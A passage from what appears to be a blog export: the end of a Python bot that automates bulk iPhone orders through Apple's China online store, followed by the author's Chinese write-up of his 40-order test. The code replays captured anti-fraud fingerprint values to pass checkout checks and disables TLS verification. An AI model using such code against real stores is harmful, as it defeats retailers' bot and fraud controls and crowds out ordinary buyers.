https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/\n        session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retryTime-1))     # 实际会重试 max_retries +1 次   所以将retry次数先减1\n        session.mount('http://', requests.adapters.HTTPAdapter(max_retries=retryTime-1))\n\n\n        # logging.debug(\"GET请求 :: %s\"%url)\n        #r = session.get(url,timeout=reqTimeout)\n        # logging.info(\"获得cookie :: %s\"%print(r.cookies)[:80])\n\n        # 在products.json中遍历对应产品,PS:从网页获取比较麻烦。\n        if not os.path.exists(os.path.join(os.path.split(os.path.abspath(__file__))[0],\"products.json\")):\n            print(\"\\n\\t\\tproducts.json文件不存在！\\n\")\n            sys.exit(0)\n        currentProduct={}\n        with open(os.path.join(os.path.split(os.path.abspath(__file__))[0],\"products.json\"),encoding='utf-8') as productFileHandle:    \n            products = json.load(productFileHandle)\n            for p in products:\n                #pdb.set_trace()\n                if p['productLocatorFamily']==order['product'] and p['dimensionCapacity']==order['capacity'] and p['dimensionColor']==order['color']:\n                    logging.debug(\"产品型号 : %s\\t%s\"%(p['partNumber'],p['seoUrlToken'])[:80])\n                    currentProduct=p\n                    break   # 找到相应产品，退出for循环\n            if len(currentProduct) == 0:\n                print(\"未找到相应产品\\t%s\\t%s\\t%s\"%(order['product'],order['capacity'],order['color']) )\n                return\n            # close products.json\n        try:\n        #if True:\n            # 验证是否启售\n            while True:\n\n                # 重试方式，但太复杂，且用修饰器也并不好实现。\n                # n = 0\n                # while n<retryTime:\n                #     try:\n                #         r=session.get(\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"+currentProduct['partNumber'],timeout=reqTimeout)\n                #         n = n + 10000       # 请求成功，跳出循环\n                #     except Exception as e:\n                #         n = n + 1\n                #         if n>=retryTime:\n                #         print(\"重试次数过多！！！ <退出>\")\n                #         return\n                # end while\n                order['remark']='出师未捷 :: '+\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"+currentProduct['partNumber']\n                logging.debug(\"\\n%s\\n\"%currentProduct)\n                r=session.get(\"https://www.apple.com/cn/shop/delivery-message?parts.0=\"+currentProduct['partNumber'],timeout=retryTimeout)\n                logging.debug(r.text)\n                deliveryMsg = json.loads(r.text,encoding='utf-8')\n                #print(orderIdentify+\"%s  %s\"%(deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['orderByDeliveryBy'],deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages']))\n\n                if '未发售' in deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages'][0] :\n                    print(orderIdentify+currentProduct['seoUrlToken']+\" || 暂未发售\")\n                    time.sleep(3)   # 隔三秒钟\n                else:\n                    print(orderIdentify+deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['orderByDeliveryBy']+deliveryMsg['body']['content']['deliveryMessage'][currentProduct['partNumber']]['deliveryOptionMessages'][0])\n                    break       # 起售！！！   跳出while死循环\n\n            # 添加购物车\n            addCartUrl=url+\"/\"+currentProduct['seoUrlToken']+\"?product=\"+currentProduct['partNumber']    \\\n                        +\"&purchaseOption=fullPrice\"                                    \\\n                        +\"&step=select\"                                                 \\\n                        +\"&dimensionCapacity=\"+currentProduct['dimensionCapacity']      \\\n                        +\"&dimensionColor=\"+currentProduct['dimensionColor']            \\\n                        +\"&part=\"+currentProduct['part']                                \\\n                        +\"&complete=true\"                                               \\\n                        +\"&dimensionScreensize=\"+currentProduct['dimensionScreensize']  \\\n                        +\"&add-to-cart=add-to-cart\"\n            print(orderIdentify+\"添加到购物车[GET] :: %s\"%addCartUrl[:80])\n            r = session.get(addCartUrl,timeout=retryTimeout)\n            \n            #pdb.set_trace()\n            # 访问购物车\n            shopBagUrl=\"https://www.apple.com/cn/shop/bag\"\n            print(orderIdentify+\"访问购物车[GET] :: %s\"%shopBagUrl[:80])\n            order['remark']=\"[失败]访问购物车 :: %s\"%shopBagUrl\n            r = session.get(shopBagUrl,timeout=retryTimeout)\n            \n            token=re.search(r'\\\"x-aos-stk\\\":\\\"(.*?)\\\"',r.text).group(1)\n            # requests.utils.add_dict_to_cookiejar(session.cookies,{\"x-aos-stk\":token})   # 此语句是将token添加到cookie.\n\n            # 修改数量  可修改为2      此处cookie中需要携带x-aos-stk，应该类似于token的作用。    # 应该可以省略！！！！！ 在结账步骤可一同实现。\n            # tmp=re.search(r'\"updateQuantity\":{\"url\":\"(/cn/shop/bagx\\?_a=updateQuantity&_m=(shoppingCart.items.item-.*?))\"',r.text)\n            # updateQuantityUrl=\"https://www.apple.com\"+tmp.group(1)\n            # if order['quantity']=='2':\n            #     r= session.post(updateQuantityUrl,data={tmp.group(2)+\".quantity\":\"2\"},headers={\"x-aos-stk\":token},timeout=reqTimeout)\n                \n            #     #pdb.set_trace()\n            #     print()\n            \n            # 结账\n            tmp=re.search(r'\\\"updateQuantity\\\":{\\\"url\\\":\\\"(/cn/shop/bagx\\?_a=updateQuantity&_m=(shoppingCart.items.item-.*?))\\\"',r.text)\n            checkoutUrl=\"https://www.apple.com/cn/shop/bagx/checkout_now?_a=checkout&_m=shoppingCart\"\n            print(orderIdentify+\"结账[POST] :: %s\"%checkoutUrl[:80])\n            order['remark']=\"[失败]结账[POST] :: %s\"%checkoutUrl\n            r= session.post(checkoutUrl,data={tmp.group(2)+\".quantity\":order['quantity'],'shoppingCart.actions.fcscounter':'NaN','shoppingCart.actions.fcsdata':''},headers={\"x-aos-stk\":token},timeout=retryTimeout)\n            \n            #pdb.set_trace()\n            signinUrl=json.loads(r.text,encoding='utf-8')['head']['data']['url']\n            print(orderIdentify+\"登录页面[GET] :: %s\"%signinUrl[:80])\n\n            order['remark']=\"[失败]登录页面[GET] :: %s\"%signinUrl\n            r=session.get(signinUrl,timeout=retryTimeout)\n            \n            guestBuyData=re.search(r'\\\"signInGuest\\\":\\{\\\"form\\\":\\\"login\\._forms\\.guestCheckoutForm\\\",\\\"url\\\":\\\"/cn/shop/sentryx/sign_in\\?(_a=login\\.guestSign.*?)\\\"',r.text).group(1)\n            \n            tmp = re.findall(r'(.*?=.*?)&',guestBuyData+\"&\")\n            data={}\n            for i in tmp:\n                data[i.split(\"=\",maxsplit=1)[0]]=i.split(\"=\",maxsplit=1)[1]\n            \n            # 两个复杂参数，硬编码！  \n            data['aywysya']='78a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly9nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWuxXVvHe9FjpidPNs0ojpVMZ90L5H6fqUdHz15tTma1eWNieLqDxpHrk0ugN.xL438IXkb9CxN4t1VKWZWudUd.z9euVrAqJkJgghmeugN.VHBQLz4mvmfTT9oaSumKkpjlRiwerbXh8bUudQUhkY5BSmmY5BNkOdhs7GY6Mk.BY8'\n            data['fdcBrowserData']='%257B%2522U%2522%253A%2522Mozilla%252F5.0%2520(Windows%253B%2520U%253B%2520Windows%2520NT%25206.1%253B%2520zh-CN)%2520AppleWebKit%252F533%252B%2520(KHTML%252C%2520like%2520Gecko)%2522%252C%2522L%2522%253A%2522zh-CN%2522%252C%2522Z%2522%253A%2522GMT%252B08%253A00%2522%252C%2522V%2522%253A%25221.0%2522%257D'\n            tmpUrl = re.search(r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/',r.text).group(1)+'/cn/shop/sentryx/sign_in'\n            logging.debug(\"访客结账[POST] :: %s\"%tmpUrl)\n            order['remark']=\"[失败]访客结账[POST] :: %s\"%tmpUrl\n            r = session.post(tmpUrl,data=data,timeout=retryTimeout)\n            \n            pltn = json.loads(r.text,encoding='utf-8')['head']['data']['args']['pltn']\n            checkoutStartUrl = json.loads(r.text,encoding='utf-8')['head']['data']['url']\n\n            logging.debug(\"结账跳转-1 [POST] :: %s\"%checkoutStartUrl)\n            order['remark']=\"[失败]结账跳转-1 [POST] :: %s\"%checkoutStartUrl\n            r = session.post(checkoutStartUrl,data={'pltn':pltn},timeout=retryTimeout)\n            \n            data={}\n            checkoutUrl = re.search(r'<form method=\\\"POST\\\" name=\\\"redirector\\\" action=\\\"(https://.*?)\\\"',r.text).group(1)\n            data['pltn'] = re.search(r'<input name=\"pltn\" type=\"\\w*?\" value=\"(.*?)\"',r.text).group(1)\n            data['v'] = re.search(r'<input name=\"v\" type=\"\\w*?\" value=\"(.*?)\"',r.text).group(1)\n            data['sessionID'] = re.search(r'<input name=\"sessionID\" type=\"\\w*?\" value=\"(.*?)\"',r.text).group(1)\n            logging.debug(\"结账跳转-2 [POST] :: %s\"%checkoutUrl)\n            order['remark']=\"[失败]结账跳转-2 [POST] :: %s\"%checkoutUrl\n            r = session.post(checkoutUrl,data=data,timeout=retryTimeout)\n            \n            # 送货选项 --> 送货地址\n            data={}\n            data['sessionID']=re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            # data['A8']=re.search(r',\"deliveryLocationType\":\"(.*?)\",\"_forms\":{\"main\":{\"fields\":\\[{\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(1)\n            # data['cartItem']=re.search(r',\"deliveryLocationType\":\"(.*?)\",\"_forms\":{\"main\":{\"fields\":\\[{\"id\":\"(cart-item-.*?deliveryLocationType)\",',r.text).group(2)\n            #data[re.search(r'\\\"id\\\":\\\"(cart-item-.*?deliveryLocationType)\\\",',r.text).group(1)]='A8'   # 2017-10-26发现该正则表达式存在匹配问题,匹配了超长的字符串\n            data[re.search(r'(cart-item-([0-9A-z]+-){5}delivery-deliveryLocationType)',r.text).group(1)]='A8'\n            \n            data['_a']='cart.cont'\n            data['_fid']='co'\n            data['_m']='cart'\n            # 有多台secure主机，需要从页面取值。\n            checkoutxUrl = re.search(r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/',r.text).group(1)+'/cn/shop/checkoutx'\n            print(orderIdentify+\"送货选项 --> 送货地址[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]送货选项 --> 送货地址[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 送货地址 --> 付款\n            data={}\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['shipping-user-lastName'] = order['lastName']\n            data['shipping-user-firstName'] = order['firstName']\n            data['shipping-user-daytimePhoneAreaCode'] = '0'\n            data['shipping-user-daytimePhone'] = order['phone']\n            data['shipping-user-state'] = order['state']\n            data['shipping-user-city'] = order['city']\n            data['shipping-user-district'] = order['district']\n            data['shipping-user-street'] = order['street']\n            data['shipping-user-street2'] = ''\n            data['shipping-user-postalCode'] = ''\n            data['shipping-user-emailAddress'] = order['email']\n            data['shipping-user-mobilePhone'] = order['phone']\n            data['state'] = order['state']\n            data['keyPath'] = 'shipping.address'\n            data['city'] = order['city']\n            data['_a'] = 'ship.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"送货地址 --> 付款[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]送货地址 --> 付款[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 付款 --> 发票\n            data={}\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['undefined'] = ''\n            data['bankOption'] = 'Alipay'\n            data['_a'] = 'bill.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"付款 --> 发票[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]付款 --> 发票[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 发票 --> 账户\n            data={}\n            data['invoice-user-invoiceEmailAddress-emailAddress'] = order['email']\n            data['invoice-fapiao-invoiceHeader'] = order['lastName']+order['firstName']\n            data['invoice-fapiao-taxPayerId'] = ''\n            data['invoice-form-options-selection'] = 'personal'\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['invoice-user-invoiceDeliveryAddress-lastName'] = order['lastName']\n            data['invoice-user-invoiceDeliveryAddress-firstName'] = order['firstName']\n            data['invoice-user-invoiceDeliveryAddress-daytimePhoneAreaCode'] = '0'\n            data['invoice-user-invoiceDeliveryAddress-daytimePhone'] = order['phone']\n            data['invoice-user-invoiceDeliveryAddress-companyName'] = ''\n            data['invoice-user-invoiceDeliveryAddress-state'] = order['state']\n            data['invoice-user-invoiceDeliveryAddress-city'] = order['city']\n            data['invoice-user-invoiceDeliveryAddress-district'] = order['district']\n            data['invoice-user-invoiceDeliveryAddress-street'] = order['street']\n            data['invoice-user-invoiceDeliveryAddress-street2'] = ''\n            data['invoice-user-invoiceDeliveryAddress-postalCode'] = ''\n            data['state'] = order['state']\n            data['keyPath'] = 'invoice.invoiceDeliveryAddress'\n            data['city'] = order['city']\n            data['_a'] = 'invoice.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"发票 --> 账户[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]发票 --> 账户[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 账户 --> 条款与条件\n            data = {}\n            data['account-appleId'] = ''\n            data['account-password'] = ''\n            data['account-passwordAgain'] = ''\n            data['account-commsPref'] = 'false'\n            data['_a'] = 'acct.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"账户 --> 条款与条件[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]账户 --> 条款与条件[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            # 同意 条款与条件\n            data = {}\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['accept'] = 'true'\n            data['acceptAppleTnc'] = 'false'\n            data['_a'] = 'terms.cont'\n            data['_fid'] = 'co'\n\n            print(orderIdentify+\"同意 条款与条件[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[失败]同意 条款与条件[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout)\n            \n            # 下订单\n            data={}\n            data['aywysya'] = 'F8a44j1d7lY5BNvcKyAdMUDFBpBeA0fUm7qKFz0XnjYrJFW73AuyPBB2SCVMvsD7z5meTuCUMz_WgpMVQdgGgeVjrkRGjftckcKyAd65hz74WySXvO3wa3wL6tqAhbrmQkLNbfyz.sU7zl998tp7ppeZLz77qZoOSix5ezdstlYrMxy0kyMpwoNLTK9Ly8nOVlQtb_GGEOpBSKxUC56MnGWpwoNSUC53ZXnN87gq1aWux_5ukV_AAUfSHolk2dUf.j7J1gBZEMgzH_y3Cmx_B4K1lSJhgSv_KU.6elV2pNJF_DA1RcrpVMZ90L5H6e0z1_yc4p0iMgdVdOOQ_KpNk0.ZNqhyA_r_LwwKdBvpZfWfUXtStKjE4PIDzpHqzQW5BNv__5BNlVnIQkFY5DjV.4v2'\n            data['sessionID'] = re.search(r'\\{\\\"name\\\":\\\"sessionID\\\",\\\"value\\\":\\\"(.*?)\\\"\\}',r.text).group(1)\n            data['promo-code'] = ''\n            data['_a'] = 'po'\n            data['_fid'] = 'co'\n\n\n            print(orderIdentify+\"下订单[POST] :: %s\"%checkoutxUrl[:80])\n            order['remark']=\"[存疑]下订单[POST] :: %s\"%checkoutxUrl\n            r = session.post(checkoutxUrl,data=data,timeout=retryTimeout*2)       # 此处timeout时间加倍\n            \n            # 订单状态\n            \n            #checkoutStatusUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',checkoutxUrl).group(1)+json.loads(r.text,encoding='utf-8')['head']['data']['url']  \n            checkoutStatusUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',r.url).group(1)+re.search(r'\\\"url\\\":\\\"(.*?)\\\"',r.text).group(1)\n            order['remark']=\"[存疑]订单状态-0 :: %s\"%tmpUrl\n            r = session.get(checkoutStatusUrl,timeout=retryTimeout)\n\n            data={}\n            data['_a']='status'\n            data['_fid']='co'\n            data['_m']='commo'\n            tmpUrl = re.search(r'(https:\\/\\/secure.?\\.store\\.apple\\.com)\\/cn\\/shop\\/',r.text).group(1)+'/cn/shop/checkoutx/status'\n\n            order['remark']=\"[存疑]订单状态-1 :: %s\"%tmpUrl\n        \n            r = session.post(tmpUrl,data=data,timeout=retryTimeout)\n\n            #tmpUrl = json.loads(r.text,encoding='utf-8')['head']['data']['url']   # 错误\n            tmpUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',r.url).group(1)+re.search(r'\\\"url\\\":\\\"(.*?)\\\"',r.text).group(1)\n            print(orderIdentify+\"订单状态 :: %s\"%tmpUrl[:80])\n            order['remark']=\"[存疑]订单状态-2 :: %s\"%tmpUrl\n            r = session.get(tmpUrl,timeout=retryTimeout)\n\n            # tmpUrl=json.loads(r.text,encoding='utf-8')['head']['data']['url'] #报错\n            tmpUrl = re.search(r'(https:\\/\\/.*?\\.apple\\.com)',r.url).group(1)+re.search(r'\\\"url\\\":\\\"(.*?)\\\"',r.text).group(1)\n\n            order['remark']=\"[存疑]谢谢 :: %s\"%tmpUrl\n            r = session.get(tmpUrl,timeout=retryTimeout)\n            \n            orderID = re.search(r',\\\"orderNumber\\\":\\\"(.*?)\\\",',r.text).group(1)\n            order['orderID'] = orderID\n            order['orderUrl']=\"https://store.apple.com/xc/cn/vieworder/\"+orderID+\"/\"+order['email']+\"/\"\n            order['remark']='成功'\n            \n            msg=order['lastName']+\t\t\\\n            order['firstName']+\"\\t\"+\t\t\\\n            order['product']+\"\\t\"+\t\t\\\n            order['color']+\"\\t\"+\t\t    \\\n            order['capacity']+\"\\t\"+\t\t\\\n            order['orderUrl']\n            print(\" 🍻🍻🍻🍻🍻 \\t\\t%s\"%msg)\n            self.orderResult(order,True)\n\n        except Exception as e:\n            order['orderID'] = ''\n            order['orderUrl'] = ''\n            self.orderResult(order,False)  # 购买失败！\n        # json订单格式使用！\n        # tmp = order['fileFullName']\n        # filePath,fileName = os.path.split(tmp)\n        # newFileName= \"done_\"+order['lastName']+order['firstName']+\"_\"+orderID+\"_\"+order['email']+fileName\n        # logging.info(\"修改订单文件 :: %s --> %s\"%(fileName,newFileName)[:80])\n        # os.rename(tmp,os.path.join(filePath,newFileName))\n\n    def orderResult(self,order,success):\n        msg=order['lastName']+\",\"+\t\t\\\n            order['firstName']+\",\"+\t\t\\\n            order['phone']+\",\"+\t\t    \\\n            order['email']+\",\"+\t\t    \\\n            order['state']+\",\"+\t\t    \\\n            order['city']+\",\"+\t\t    \\\n            order['district']+\",\"+\t\t\\\n            order['street']+\",\"+\t\t\\\n            order['payment']+\",\"+\t\t\\\n            order['product']+\",\"+\t\t\\\n            order['color']+\",\"+\t\t    \\\n            order['capacity']+\",\"+\t\t\\\n            order['quantity']+\",\"+\t\t\\\n            order['orderID']+\",\"+\t\t\\\n            order['orderUrl']+\",\"+      \\\n            order['remark']+\"\\n\"\n        self.threadLock.acquire()\n        with open(orderResult,'a+',encoding='utf-8') as fp:\n            fp.writelines(msg)\n        self.threadLock.release()\n# 参数处理\ndef main():\n    headCharPic=\"\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   < Author: Mr.Bingo >\\n      //   \\ \\   ------------------ \\n     (|     | ) <    oddboy.cn     >\\n    /'\\_   _/`\\  ------------------\\n    \\___)=(___/\\n\"\n    print(headCharPic)\n    # Creating a parser\n    buyer=iPhoneBuyer()\n    buyer.run_Threads()\n\nif __name__ == '__main__':\n    main()\n\n```","slug":"iPhoneX抢购Python脚本","published":1,"updated":"2017-10-31T08:37:52.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsw000t97uv4lgc3jb0","content":"<h2 id=\"叨逼叨\"><a href=\"#叨逼叨\" class=\"headerlink\" title=\"叨逼叨\"></a>叨逼叨</h2><p>原本以为iPhone X会被疯抢，所谓八仙过海各显神通，我就想着用自己的野路子看看凑效不？</p>\n<p>经过几天的流程梳理，代码编写及优化，在27号前夕以iPhone 8作为测试，效果是灰常的好！<br><a id=\"more\"></a><br><img src=\"/2017/10/iPhoneX抢购Python脚本/image01.jpg\" alt=\"\"></p>\n<p>批量下单(iphone8/8p),跑了40个订单,每个订单一条线程，20秒左右全部订单成功，邮箱也瞬间收到几十封邮件：</p>\n<p><img src=\"/2017/10/iPhoneX抢购Python脚本/image02.png\" alt=\"\"></p>\n<h2 id=\"失落的转折\"><a href=\"#失落的转折\" class=\"headerlink\" title=\"失落的转折\"></a>失落的转折</h2><p>27日早上开始，苹果官网下单功能维护，直到下午三点功能才正常。 不过，在购物车跳转到支付页面的相关参数被改动了。所以，gg了！</p>\n<p><img src=\"/2017/10/iPhoneX抢购Python脚本/image03.png\" alt=\"\"></p>\n<h2 id=\"记录总结一下-付出总会有收获\"><a href=\"#记录总结一下-付出总会有收获\" class=\"headerlink\" title=\"记录总结一下 | 付出总会有收获\"></a>记录总结一下 | 付出总会有收获</h2><p>几天过去了，今天回过头来稍微整理下，记录下来，好歹也付出过不是？</p>\n<p>今天再次查看苹果网站，之前修改的参数点现在又修改回去了。不过在最后的下订单环节应该有增加了一些防护，所以我的脚本还是不能用。</p>\n<hr>\n<ul>\n<li>python可以直接读取json文件转换为dict.非常好用！</li>\n<li><p>用datetime库来判断时间点：</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">tmp= datetime.datetime(<span class=\"number\">2017</span>,<span class=\"number\">10</span>,<span class=\"number\">27</span>,<span class=\"number\">6</span>,<span class=\"number\">58</span>).timestamp()-time.timezone - datetime.datetime.now().timestamp()</div><div class=\"line\"><span class=\"keyword\">if</span> tmp&gt;<span class=\"number\">0</span>:  <span class=\"comment\"># UTC时间！   </span></div><div class=\"line\">    print(orderIdentify+<span class=\"string\">\"🤕\\tiphone X 尚未起售！ == %d minutes ==\"</span>%(tmp/<span class=\"number\">60</span>))</div><div class=\"line\">    <span class=\"keyword\">return</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>使用requests.session类来处理多步骤的请求，可以自动处理cookie问题，自动重试功能也非常赞！</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">session=requests.session()      <span class=\"comment\"># session会话可以自动保存和处理cookie</span></div><div class=\"line\">session.proxies=proxies</div><div class=\"line\">session.verify=<span class=\"keyword\">False</span></div><div class=\"line\">session.timeout=<span class=\"number\">30</span>          <span class=\"comment\"># 此处设置timeout无用</span></div><div class=\"line\">session.headers=&#123;<span class=\"string\">'User-Agent'</span>:userAgent&#125;</div><div class=\"line\"><span class=\"comment\"># https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/</span></div><div class=\"line\">session.mount(<span class=\"string\">'https://'</span>, requests.adapters.HTTPAdapter(max_retries=retryTime<span class=\"number\">-1</span>))     <span class=\"comment\"># 实际会重试 max_retries +1 次   所以将retry次数先减1</span></div><div class=\"line\">session.mount(<span class=\"string\">'http://'</span>, requests.adapters.HTTPAdapter(max_retries=retryTime<span class=\"number\">-1</span>))</div></pre></td></tr></table></figure>\n</li>\n<li><p>也许直接使用浏览器模拟器是更好的选择（如mechanize selenium），虽然“重”了些，但简单易处理。</p>\n</li>\n</ul>\n<h2 id=\"上代码-感兴趣的拿走不谢\"><a href=\"#上代码-感兴趣的拿走不谢\" class=\"headerlink\" title=\"上代码 | 感兴趣的拿走不谢\"></a>上代码 | 感兴趣的拿走不谢</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div 